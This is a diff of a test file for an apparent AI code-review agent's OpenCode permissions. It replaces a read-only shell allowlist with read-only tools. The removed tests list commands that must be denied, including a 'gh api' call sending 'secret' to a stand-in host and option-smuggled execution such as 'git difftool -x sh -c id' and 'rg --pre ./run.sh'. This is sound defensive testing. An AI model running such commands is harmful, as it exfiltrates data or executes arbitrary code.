@@ -3,7 +3,7 @@ import { delimiter, join } from "node:path";
 import { describe, expect, it } from "vitest";
 import { extractObject, normalise } from "../src/agent.js";
 import { prettyModel } from "../src/cursor.js";
-import { READ_ONLY_BASH, SHELL_NOTE, opencodeLabel, opencodeReply } from "../src/opencode.js";
+import { TOOLS_NOTE, opencodeLabel, opencodeReply } from "../src/opencode.js";
 import { newDir, run } from "./helpers.js";
 
 const sha = "1e43c532b81527f0c71614b8220c3ea8436710d9";
@@ -404,11 +404,18 @@ describe("agent opencode", () => {
     // The pull request's own opencode.json must not widen the permissions.
     expect(call.noProjectConfig).toBe("1");
     expect(call.input).toContain("THE REVIEW METHOD");
-    expect(call.input.endsWith(SHELL_NOTE)).toBe(true);
+    expect(call.input.endsWith(TOOLS_NOTE)).toBe(true);
+    // Only the reading tools. "*" first, so the allowances after it win.
     const permission = JSON.parse(call.config as string).permission;
-    expect(permission).toMatchObject({ edit: "deny", webfetch: "deny", websearch: "deny" });
-    expect(permission.external_directory).toEqual({ "*": "deny", [`${workdir}/*`]: "allow" });
-    expect(permission.bash).toEqual(READ_ONLY_BASH);
+    expect(permission).toEqual({
+      "*": "deny",
+      read: "allow",
+      grep: "allow",
+      glob: "allow",
+      list: "allow",
+      external_directory: { "*": "deny", [`${workdir}/*`]: "allow" },
+    });
+    expect(Object.keys(permission)[0]).toBe("*");
   });
 
   it("passes --model and --variant through and labels with the model", async () => {
@@ -482,7 +489,7 @@ describe("agent arguments", () => {
     // The default method is this skill's SKILL.md.
     expect(stdout).toContain("<review-method>\n---\nname: mizcode-reviewer\n");
     expect(stdout).toContain("Do not run `review.js`");
-    expect(stdout).toContain("## Shell in this run");
+    expect(stdout).toContain("## Tools in this run");
     expect(existsSync(join(workdir, "findings.json"))).toBe(true);
   });
 
@@ -614,72 +621,11 @@ describe("labels", () => {
   });
 });
 
-describe("opencode permissions", () => {
-  it("denies every other command instead of asking", () => {
-    // "ask" would leave a run with no one at the keyboard waiting forever.
-    expect(Object.entries(READ_ONLY_BASH)[0]).toEqual(["*", "deny"]);
-    expect(Object.values(READ_ONLY_BASH)).not.toContain("ask");
-  });
-
-  it("puts each write denial after the allowances it narrows", () => {
-    // The last matching rule wins.
-    const keys = Object.keys(READ_ONLY_BASH);
-    const lastAllow = Math.max(...keys.map((key, i) => (READ_ONLY_BASH[key] === "allow" ? i : -1)));
-    for (const pattern of ["*>*", "*--output*", "rg *--pre*", "rg *--hostname-bin*"]) {
-      expect(READ_ONLY_BASH[pattern]).toBe("deny");
-      expect(keys.indexOf(pattern)).toBeGreaterThan(lastAllow);
-    }
-  });
-
-  it("allows no gh command at all", () => {
-    expect(Object.keys(READ_ONLY_BASH).filter((key) => key.startsWith("gh"))).toEqual([]);
-    expect(SHELL_NOTE).not.toContain("gh api");
-  });
-
-  // OpenCode's matcher: * is any text, the rule matches the whole command,
-  // and the last matching rule wins.
-  function decide(command: string): string | undefined {
-    let decision: string | undefined;
-    for (const [pattern, action] of Object.entries(READ_ONLY_BASH)) {
-      const regex = new RegExp(`^${pattern.split("*").map((part) => part.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).join(".*")}$`, "s");
-      if (regex.test(command)) decision = action;
-    }
-    return decision;
-  }
-
-  it.each([
-    ["git diff", "allow"],
-    ["git diff HEAD~1 -- src/app.ts", "allow"],
-    ["git log --oneline -5", "allow"],
-    ["git show HEAD:src/app.ts", "allow"],
-    ["ls", "allow"],
-    ["ls -la src", "allow"],
-    ["rg -n tenantId src", "allow"],
-    [`gh api "repos/o/r/contents/src/app.ts?ref=${sha}" --jq .content`, "deny"],
-    ["gh api repos/o/r/issues/1/comments -if body=hi", "deny"],
-    ['gh api "repos/o/r?d=secret" --hostname example.invalid', "deny"],
-    ["base64 -d -o out.txt in.b64", "deny"],
-    ["git difftool -y -x 'sh -c id' HEAD~1", "deny"],
-    ["git diff-tree -r HEAD", "deny"],
-    ["lsof -p 1", "deny"],
-    ["rg --pre ./run.sh x", "deny"],
-    ["rg --hyperlink-format default --hostname-bin ./run.sh x", "deny"],
-    ["rg --hostname-bin=./run.sh x", "deny"],
-    ["git log --output=/tmp/x", "deny"],
-    ["cat a > b", "deny"],
-    ["gh api repos/o/r/issues -fbody=hi", "deny"],
-    ["gh api repos/o/r/issues -Fbody=hi", "deny"],
-    ["gh api repos/o/r/issues -f body=hi", "deny"],
-    ["gh api repos/o/r/issues --method POST", "deny"],
-    ["gh api repos/o/r/issues -XPOST", "deny"],
-    ["sh -c id", "deny"],
-  ])("decides %j as %s", (command, decision) => {
-    expect(decide(command)).toBe(decision);
-  });
-
+describe("opencode tools", () => {
   it("tells the model to return an error for code it could not read", () => {
-    expect(SHELL_NOTE).toContain('{"error":');
-    expect(SHELL_NOTE).toContain("Never return an empty review");
+    expect(TOOLS_NOTE).toContain('{"error":');
+    expect(TOOLS_NOTE).toContain("Never return an empty review");
+    expect(TOOLS_NOTE).toContain("There is no shell");
   });
 
   it("reads the error event of a failed run", () => {
